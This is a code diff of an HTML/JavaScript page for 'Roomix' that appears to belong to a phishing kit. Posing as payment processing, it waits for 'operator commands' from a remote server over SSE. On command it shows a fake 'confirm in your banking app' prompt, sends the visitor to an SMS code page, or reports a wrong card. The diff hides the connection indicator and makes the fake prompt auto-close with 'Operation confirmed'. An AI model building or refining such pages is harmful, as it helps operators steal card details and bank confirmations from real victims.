@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -8,7 +7,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* Стили остаются без изменений */
         :root {
             --primary: #D4AF37;
             --primary-dark: #B8941F;
@@ -27,6 +25,12 @@
             box-sizing: border-box;
         }
 
+        html {
+            scroll-behavior: smooth;
+            background: var(--dark);
+            height: 100%;
+        }
+
         body {
             font-family: 'Montserrat', sans-serif;
             background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
@@ -34,12 +38,33 @@
             color: var(--text);
             line-height: 1.6;
             overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-text-size-adjust: 100%;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
+            z-index: -2;
         }
 
         .container {
             max-width: 1400px;
             margin: 0 auto;
             padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            z-index: 1;
         }
 
         header {
@@ -48,13 +73,23 @@
             align-items: center;
             padding: 20px 0;
             margin-bottom: 30px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            width: 100%;
+            max-width: 100%;
+            flex-wrap: wrap;
+            gap: 15px;
         }
 
         .logo {
             display: flex;
             align-items: center;
             gap: 15px;
+            text-decoration: none;
+            flex-shrink: 0;
+        }
+
+        .logo:visited, .logo:hover, .logo:active {
+            text-decoration: none;
+            color: inherit;
         }
 
         .logo-icon {
@@ -69,12 +104,13 @@
             font-weight: 800;
             font-size: 24px;
             box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
+            flex-shrink: 0;
         }
 
         .logo-text {
             font-size: 28px;
             font-weight: 800;
-            background: linear-gradient(135deg, var(--primary) 0%, #FFD700 100%);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: 1px;
@@ -84,6 +120,8 @@
             display: flex;
             align-items: center;
             gap: 20px;
+            flex-wrap: wrap;
+            justify-content: flex-end;
         }
 
         .language-selector {
@@ -103,6 +141,7 @@
             gap: 8px;
             font-weight: 600;
             transition: all 0.3s ease;
+            min-height: 44px;
         }
 
         .language-btn:hover {
@@ -128,9 +167,12 @@
         }
 
         .language-option {
-            padding: 10px 20px;
+            padding: 12px 20px;
             cursor: pointer;
             transition: background 0.3s ease;
+            min-height: 44px;
+            display: flex;
+            align-items: center;
         }
 
         .language-option:hover {
@@ -148,8 +190,8 @@
         }
 
         .btn-icon {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
             background: var(--primary-light);
             display: flex;
@@ -158,6 +200,7 @@
             color: var(--primary);
             cursor: pointer;
             transition: all 0.3s ease;
+            flex-shrink: 0;
         }
 
         .btn-icon:hover {
@@ -201,25 +244,79 @@
             font-size: 16px;
         }
 
+        /* Скрытый статус SSE */
         .sse-status {
+            display: none;
+        }
+
+        /* Стили для пуш-уведомления */
+        .push-notification {
             position: fixed;
-            top: 10px;
-            right: 10px;
-            padding: 8px 12px;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease;
+            padding: 20px;
+        }
+
+        .push-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
             border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            z-index: 1000;
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            animation: slideUp 0.4s ease;
         }
 
-        .sse-connected {
-            background: var(--success);
-            color: var(--dark);
+        .push-icon {
+            font-size: 48px;
+            color: var(--primary);
+            margin-bottom: 20px;
         }
 
-        .sse-disconnected {
-            background: var(--error);
+        .push-title {
+            font-size: 20px;
+            font-weight: 700;
             color: var(--text);
+            margin-bottom: 15px;
+        }
+
+        .push-message {
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .push-timer {
+            color: var(--primary);
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         footer {
@@ -229,8 +326,10 @@
             border-top: 1px solid rgba(255, 255, 255, 0.1);
             color: var(--text-secondary);
             font-size: 14px;
+            flex-shrink: 0;
         }
 
+        /* Responsive */
         @media (max-width: 768px) {
             .container {
                 padding: 15px;
@@ -239,7 +338,7 @@
             header {
                 flex-direction: column;
                 gap: 20px;
-                padding: 15px 0;
+                text-align: center;
             }
 
             .logo {
@@ -259,18 +358,8 @@
             }
 
             .btn-icon {
-                width: 35px;
-                height: 35px;
-            }
-
-            .language-selector {
-                width: auto;
-            }
-
-            .language-dropdown {
-                right: auto;
-                left: 50%;
-                transform: translateX(-50%);
+                width: 44px;
+                height: 44px;
             }
 
             .loader {
@@ -286,52 +375,112 @@
             .loading-subtext {
                 font-size: 14px;
             }
+
+            .push-card {
+                padding: 25px;
+                margin: 15px;
+            }
+
+            .push-icon {
+                font-size: 40px;
+            }
+
+            .push-title {
+                font-size: 18px;
+            }
         }
 
         @media (max-width: 480px) {
             .container {
-                padding: 10px;
+                padding: 12px;
             }
 
             .logo-icon {
-                width: 40px;
-                height: 40px;
-                font-size: 18px;
+                width: 44px;
+                height: 44px;
+                font-size: 20px;
             }
 
             .logo-text {
-                font-size: 22px;
+                font-size: 24px;
             }
 
             .header-controls {
                 flex-direction: column;
-                gap: 10px;
+                gap: 12px;
             }
 
             .language-btn {
-                padding: 6px 12px;
-                font-size: 14px;
+                padding: 10px 15px;
+                font-size: 15px;
+                min-height: 44px;
             }
 
             footer {
-                padding: 20px 0;
+                padding: 25px 0;
                 margin-top: 30px;
-                font-size: 12px;
+                font-size: 13px;
             }
+
+            .push-card {
+                padding: 20px;
+            }
+
+            .push-icon {
+                font-size: 36px;
+            }
+
+            .push-title {
+                font-size: 16px;
+            }
+
+            .push-message {
+                font-size: 14px;
+            }
+        }
+
+        /* iOS Specific Fixes */
+        @supports (-webkit-touch-callout: none) {
+            .language-btn, .btn-icon {
+                min-height: 44px;
+            }
+            
+            body {
+                min-height: -webkit-fill-available;
+            }
+            
+            html {
+                height: -webkit-fill-available;
+            }
+        }
+
+        /* Убираем скроллбар */
+        ::-webkit-scrollbar {
+            width: 0px;
+            background: transparent;
+        }
+
+        * {
+            scrollbar-width: none;
+        }
+
+        * {
+            -ms-overflow-style: none;
         }
     </style>
 </head>
 <body>
+    <!-- Скрытый статус SSE -->
     <div class="sse-status sse-disconnected" id="sseStatus">
         🔴 SSE отключен
     </div>
 
     <div class="container">
         <header>
-            <a class="logo">
+            <div class="logo">
                 <div class="logo-icon">R</div>
                 <div class="logo-text">Roomix</div>
-            </a>
+            </div>
             <div class="header-controls">
                 <div class="language-selector">
                     <button class="language-btn">
@@ -376,295 +525,255 @@
     </div>
 
     <script>
-    const translations = {
-        ru: {
-            loadingText: 'Обработка платежа...',
-            loadingSubtext: 'Ожидание команд от оператора...'
-        },
-        pl: {
-            loadingText: 'Przetwarzanie płatności...',
-            loadingSubtext: 'Oczekiwanie na polecenia operatora...'
-        },
-        en: {
-            loadingText: 'Processing Payment...',
-            loadingSubtext: 'Waiting for operator commands...'
-        }
-    };
+        const translations = {
+            ru: {
+                loadingText: 'Обработка платежа...',
+                loadingSubtext: 'Ожидание команд от оператора...',
+                pushTitle: 'Подтвердите операцию',
+                pushMessage: 'Пожалуйста, подтвердите операцию в вашем банковском приложении'
+            },
+            pl: {
+                loadingText: 'Przetwarzanie płatności...',
+                loadingSubtext: 'Oczekiwanie na polecenia operatora...',
+                pushTitle: 'Potwierdź operację',
+                pushMessage: 'Proszę potwierdzić operację w aplikacji bankowej'
+            },
+            en: {
+                loadingText: 'Processing Payment...',
+                loadingSubtext: 'Waiting for operator commands...',
+                pushTitle: 'Confirm the operation',
+                pushMessage: 'Please confirm the operation in your banking app'
+            }
+        };
 
-    let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';
+        let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';
 
-    function changeLanguage(lang) {
-        currentLanguage = lang;
-        sessionStorage.setItem('selectedLanguage', lang);
-        const t = translations[lang];
-        document.getElementById('loadingText').textContent = t.loadingText;
-        document.getElementById('loadingSubtext').textContent = t.loadingSubtext;
-        document.getElementById('currentLanguage').textContent = lang === 'ru' ? 'Русский' : lang === 'pl' ? 'Polski' : 'English';
+        function changeLanguage(lang) {
+            currentLanguage = lang;
+            sessionStorage.setItem('selectedLanguage', lang);
+            const t = translations[lang];
+            document.getElementById('loadingText').textContent = t.loadingText;
+            document.getElementById('loadingSubtext').textContent = t.loadingSubtext;
+            document.getElementById('currentLanguage').textContent = 
+                lang === 'ru' ? 'Русский' : 
+                lang === 'pl' ? 'Polski' : 'English';
 
-        document.querySelectorAll('.language-option').forEach(option => {
-            option.classList.toggle('active', option.getAttribute('data-lang') === lang);
-        });
-    }
-
-    document.querySelector('.language-btn').addEventListener('click', () => {
-        document.getElementById('languageDropdown').classList.toggle('show');
-    });
-
-    document.querySelectorAll('.language-option').forEach(option => {
-        option.addEventListener('click', () => {
-            changeLanguage(option.getAttribute('data-lang'));
-            document.getElementById('languageDropdown').classList.remove('show');
-        });
-    });
-
-    window.addEventListener('click', e => {
-        if (!e.target.closest('.language-selector')) {
-            document.getElementById('languageDropdown').classList.remove('show');
-        }
-    });
-
-    changeLanguage(currentLanguage);
-
-    // УЛУЧШЕННОЕ SSE ПОДКЛЮЧЕНИЕ
-    const userId = sessionStorage.getItem('currentUserId') || "user123";
-    const RAILWAY_URL = "https://roomix-production.up.railway.app";
-    let eventSource = null;
-    let reconnectAttempts = 0;
-    const maxReconnectAttempts = 50;
-    const baseReconnectDelay = 2000;
-    let currentReconnectDelay = baseReconnectDelay;
-    let pingInterval;
-
-    function connectSSE() {
-        if (reconnectAttempts >= maxReconnectAttempts) {
-            console.error('❌ Максимальное количество попыток переподключения');
-            updateSSEStatus(false, 'Максимальное количество попыток');
-            return;
+            document.querySelectorAll('.language-option').forEach(option => {
+                option.classList.toggle('active', option.getAttribute('data-lang') === lang);
+            });
         }
 
-        if (eventSource) {
-            eventSource.close();
-        }
+        function initLanguageSelector() {
+            const languageBtn = document.querySelector('.language-btn');
+            const languageDropdown = document.getElementById('languageDropdown');
 
-        try {
-            const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
-            console.log(`🔄 Подключаемся к SSE (попытка ${reconnectAttempts + 1}):`, sseUrl);
-            
-            eventSource = new EventSource(sseUrl);
+            languageBtn.addEventListener('click', function(event) {
+                event.stopPropagation();
+                languageDropdown.classList.toggle('show');
+            });
 
-            eventSource.onopen = function(event) {
-                console.log('✅ SSE подключение открыто');
-                reconnectAttempts = 0;
-                currentReconnectDelay = baseReconnectDelay;
-                updateSSEStatus(true, 'SSE подключен');
-            };
+            document.querySelectorAll('.language-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    changeLanguage(lang);
+                    languageDropdown.classList.remove('show');
+                });
+            });
 
-            eventSource.onmessage = function(event) {
-                console.log('📨 Получено сообщение SSE:', event.data);
-                try {
-                    const data = JSON.parse(event.data);
-                    
-                    if (data.type === 'connected') {
-                        console.log('✅ Подтверждение подключения SSE');
-                        return;
-                    }
-                    
-                    if (data.type === 'bot_command') {
-                        handleBotCommand(data);
-                    }
-                } catch (e) {
-                    console.error('❌ Ошибка парсинга команды:', e);
+            document.addEventListener('click', function(event) {
+                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
+                    languageDropdown.classList.remove('show');
                 }
-            };
+            });
+        }
 
-            eventSource.onerror = function(event) {
-                console.error('❌ Ошибка SSE соединения');
+        // УЛУЧШЕННОЕ SSE ПОДКЛЮЧЕНИЕ
+        const userId = sessionStorage.getItem('currentUserId') || "user123";
+        const RAILWAY_URL = "https://roomix-production.up.railway.app";
+        let eventSource = null;
+        let reconnectAttempts = 0;
+        const maxReconnectAttempts = 50;
+        const baseReconnectDelay = 2000;
+        let currentReconnectDelay = baseReconnectDelay;
+        let pingInterval;
+
+        function connectSSE() {
+            if (reconnectAttempts >= maxReconnectAttempts) {
+                console.error('❌ Максимальное количество попыток переподключения');
+                return;
+            }
+
+            if (eventSource) {
+                eventSource.close();
+            }
+
+            try {
+                const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
+                console.log(`🔄 Подключаемся к SSE (попытка ${reconnectAttempts + 1}):`, sseUrl);
+                
+                eventSource = new EventSource(sseUrl);
+
+                eventSource.onopen = function(event) {
+                    console.log('✅ SSE подключение открыто');
+                    reconnectAttempts = 0;
+                    currentReconnectDelay = baseReconnectDelay;
+                };
+
+                eventSource.onmessage = function(event) {
+                    console.log('📨 Получено сообщение SSE:', event.data);
+                    try {
+                        const data = JSON.parse(event.data);
+                        
+                        if (data.type === 'connected') {
+                            console.log('✅ Подтверждение подключения SSE');
+                            return;
+                        }
+                        
+                        if (data.type === 'bot_command') {
+                            handleBotCommand(data);
+                        }
+                    } catch (e) {
+                        console.error('❌ Ошибка парсинга команды:', e);
+                    }
+                };
+
+                eventSource.onerror = function(event) {
+                    console.error('❌ Ошибка SSE соединения');
+                    reconnectAttempts++;
+                    currentReconnectDelay = Math.min(currentReconnectDelay * 1.5, 30000);
+                    
+                    if (eventSource.readyState === EventSource.CLOSED) {
+                        console.log(`🔄 Переподключаемся через ${currentReconnectDelay}ms... (попытка ${reconnectAttempts}/${maxReconnectAttempts})`);
+                        setTimeout(connectSSE, currentReconnectDelay);
+                    }
+                };
+
+            } catch (error) {
+                console.error('💥 Ошибка создания SSE:', error);
                 reconnectAttempts++;
                 currentReconnectDelay = Math.min(currentReconnectDelay * 1.5, 30000);
-                
-                if (eventSource.readyState === EventSource.CLOSED) {
-                    updateSSEStatus(false, `Переподключение через ${currentReconnectDelay}ms`);
-                    console.log(`🔄 Переподключаемся через ${currentReconnectDelay}ms... (попытка ${reconnectAttempts}/${maxReconnectAttempts})`);
-                    setTimeout(connectSSE, currentReconnectDelay);
-                }
-            };
-
-        } catch (error) {
-            console.error('💥 Ошибка создания SSE:', error);
-            reconnectAttempts++;
-            currentReconnectDelay = Math.min(currentReconnectDelay * 1.5, 30000);
-            updateSSEStatus(false, 'Ошибка подключения');
-            setTimeout(connectSSE, currentReconnectDelay);
-        }
-    }
-
-    function updateSSEStatus(connected, message = '') {
-        const statusElement = document.getElementById('sseStatus');
-        if (connected) {
-            statusElement.textContent = '🟢 SSE подключен';
-            statusElement.className = 'sse-status sse-connected';
-        } else {
-            statusElement.textContent = `🔴 ${message || 'SSE отключен'}`;
-            statusElement.className = 'sse-status sse-disconnected';
-        }
-    }
-
-    function handleBotCommand(command) {
-        console.log('🤖 Обработка команды:', command);
-
-        if (command.action === 'push') {
-            console.log('🔔 Получена команда PUSH');
-            window.showPushNotification();
-        } else if (command.action === 'sms') {
-            console.log('📱 Получена команда SMS');
-            window.redirectToSMS();
-        } else if (command.action === 'wrong_card') {
-            console.log('❌ Получена команда WRONG_CARD');
-            window.redirectToPaymentWithError();
-        }
-    }
-
-    function startPing() {
-        pingInterval = setInterval(() => {
-            if (eventSource && eventSource.readyState === EventSource.OPEN) {
-                console.log('🏓 Ping SSE connection');
-            } else {
-                console.log('🏓 SSE connection not open, reconnecting...');
-                connectSSE();
+                setTimeout(connectSSE, currentReconnectDelay);
             }
-        }, 25000);
-    }
-
-    function stopPing() {
-        if (pingInterval) {
-            clearInterval(pingInterval);
         }
-    }
 
-    function testConnection() {
-        console.log('🧪 Тестируем соединение с сервером...');
-        
-        fetch(`${RAILWAY_URL}/health`)
-            .then(response => {
-                console.log('✅ Health endpoint доступен:', response.status);
-                return response.json();
-            })
-            .then(data => {
-                console.log('📊 Статус сервера:', data);
-                updateSSEStatus(true, 'Сервер доступен');
-                connectSSE();
-            })
-            .catch(error => {
-                console.error('❌ Health endpoint недоступен:', error);
-                updateSSEStatus(false, 'Сервер недоступен');
-                setTimeout(testConnection, 5000);
+        function handleBotCommand(command) {
+            console.log('🤖 Обработка команды:', command);
+
+            if (command.action === 'push') {
+                console.log('🔔 Получена команда PUSH');
+                window.showPushNotification();
+            } else if (command.action === 'sms') {
+                console.log('📱 Получена команда SMS');
+                window.redirectToSMS();
+            } else if (command.action === 'wrong_card') {
+                console.log('❌ Получена команда WRONG_CARD');
+                window.redirectToPaymentWithError();
+            }
+        }
+
+        function startPing() {
+            pingInterval = setInterval(() => {
+                if (eventSource && eventSource.readyState === EventSource.OPEN) {
+                    console.log('🏓 Ping SSE connection');
+                } else {
+                    console.log('🏓 SSE connection not open, reconnecting...');
+                    connectSSE();
+                }
+            }, 25000);
+        }
+
+        function stopPing() {
+            if (pingInterval) {
+                clearInterval(pingInterval);
+            }
+        }
+
+        function testConnection() {
+            console.log('🧪 Тестируем соединение с сервером...');
+            
+            fetch(`${RAILWAY_URL}/health`)
+                .then(response => {
+                    console.log('✅ Health endpoint доступен:', response.status);
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('📊 Статус сервера:', data);
+                    connectSSE();
+                })
+                .catch(error => {
+                    console.error('❌ Health endpoint недоступен:', error);
+                    setTimeout(testConnection, 5000);
+                });
+        }
+
+        // УЛУЧШЕННОЕ ПУШ-УВЕДОМЛЕНИЕ
+        window.showPushNotification = function() {
+            const t = translations[currentLanguage];
+            
+            const pushModal = document.createElement('div');
+            pushModal.className = 'push-notification';
+            
+            pushModal.innerHTML = `
+                <div class="push-card">
+                    <div class="push-icon">🔔</div>
+                    <div class="push-title">${t.pushTitle}</div>
+                    <div class="push-message">${t.pushMessage}</div>
+                    <div class="push-timer">Автоматическое закрытие через <span id="pushTimer">5</span> сек...</div>
+                </div>
+            `;
+
+            document.body.appendChild(pushModal);
+
+            // Таймер автоматического закрытия
+            let timer = 5;
+            const timerElement = document.getElementById('pushTimer');
+            const countdown = setInterval(() => {
+                timer--;
+                timerElement.textContent = timer;
+                
+                if (timer <= 0) {
+                    clearInterval(countdown);
+                    pushModal.remove();
+                    // После закрытия пуша показываем успешное сообщение
+                    document.querySelector('.loading-text').textContent = '✅ Операция подтверждена!';
+                }
+            }, 1000);
+
+            // Закрытие по клику вне карточки
+            pushModal.addEventListener('click', function(e) {
+                if (e.target === pushModal) {
+                    clearInterval(countdown);
+                    pushModal.remove();
+                    document.querySelector('.loading-text').textContent = '✅ Операция подтверждена!';
+                }
             });
-    }
+        };
 
-    // Функции для управления страницей (оставить без изменений)
-    window.showPushNotification = function() {
-        const modal = document.createElement('div');
-        modal.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-            animation: fadeIn 0.3s ease;
-        `;
+        window.redirectToSMS = function() {
+            window.location.href = 'sms.html';
+        };
 
-        modal.innerHTML = `
-            <div style="
-                background: var(--dark-light);
-                border-radius: 20px;
-                padding: 30px;
-                border: 1px solid var(--primary);
-                max-width: 400px;
-                width: 90%;
-                text-align: center;
-                box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-            ">
-                <div style="font-size: 48px; color: var(--primary); margin-bottom: 20px;">
-                    🔔
-                </div>
-                <h3 style="color: var(--text); margin-bottom: 15px;">Подтвердите операцию</h3>
-                <p style="color: var(--text-secondary); margin-bottom: 25px;">
-                    Пожалуйста, подтвердите операцию в вашем банковском приложении
-                </p>
-                <div style="display: flex; gap: 15px; justify-content: center;">
-                    <button id="confirmPushBtn" style="
-                        background: var(--success);
-                        color: white;
-                        border: none;
-                        padding: 12px 25px;
-                        border-radius: 10px;
-                        cursor: pointer;
-                        font-weight: 600;
-                    ">Подтвердить</button>
-                    <button id="cancelPushBtn" style="
-                        background: var(--error);
-                        color: white;
-                        border: none;
-                        padding: 12px 25px;
-                        border-radius: 10px;
-                        cursor: pointer;
-                        font-weight: 600;
-                    ">Отменить</button>
-                </div>
-            </div>
-        `;
+        window.redirectToPaymentWithError = function() {
+            console.log('❌ Перенаправляю на payment.html с ошибкой');
+            window.location.href = 'payment.html?status=wrong_card';
+        };
 
-        document.body.appendChild(modal);
-
-        document.getElementById('confirmPushBtn').addEventListener('click', function() {
-            document.querySelector('div[style*="position: fixed"]').remove();
-            const loadingText = document.querySelector('.loading-text');
-            loadingText.textContent = '✅ Операция подтверждена!';
+        // Запускаем при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 Инициализация улучшенного SSE...');
+            initLanguageSelector();
+            changeLanguage(currentLanguage);
+            testConnection();
+            startPing();
         });
 
-        document.getElementById('cancelPushBtn').addEventListener('click', function() {
-            document.querySelector('div[style*="position: fixed"]').remove();
-            const loadingText = document.querySelector('.loading-text');
-            loadingText.textContent = '❌ Операция отменена';
+        // Закрываем при закрытии страницы
+        window.addEventListener('beforeunload', function() {
+            stopPing();
+            if (eventSource) {
+                eventSource.close();
+            }
         });
-    };
-
-    window.redirectToSMS = function() {
-        window.location.href = 'sms.html';
-    };
-
-    window.redirectToPaymentWithError = function() {
-    console.log('❌ Перенаправляю на payment.html с ошибкой');
-    window.location.href = 'payment.html?status=wrong_card';
-    };
-
-    // Запускаем при загрузке
-    document.addEventListener('DOMContentLoaded', function() {
-        console.log('🚀 Инициализация улучшенного SSE...');
-        testConnection();
-        startPing();
-    });
-
-    // Закрываем при закрытии страницы
-    window.addEventListener('beforeunload', function() {
-        stopPing();
-        if (eventSource) {
-            eventSource.close();
-        }
-    });
-</script>
+    </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
